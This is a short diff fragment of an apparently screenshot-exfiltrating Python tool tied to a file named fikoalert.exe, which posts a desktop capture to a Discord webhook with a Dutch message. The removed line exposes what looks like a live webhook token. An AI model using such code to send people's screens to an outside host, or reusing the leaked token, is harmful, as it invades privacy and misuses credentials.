@@ -25,7 +25,7 @@ def send_to_discord(webhook_url, file):
     else:
         print(f"Failed to send screenshot. Status code: {response.status_code}")
 
-webhook_url = "https://discord.com/api/webhooks/1327001774636404828/un6Z5d8efzD28ygQuXAGoBfMKra68ofsjhqKVgHDOoyll0yE5SqeGsu64rS8OwOijpwE"
+webhook_url = "WEBHOOK HERE"
 message = "<@569169878200877056> Hier is de screenshot van je bureaublad. Om dit te verwijderen, druk WIN + R, en verwijder het bestand genaamd fikoalert.exe"
 payload = {
     'content': message
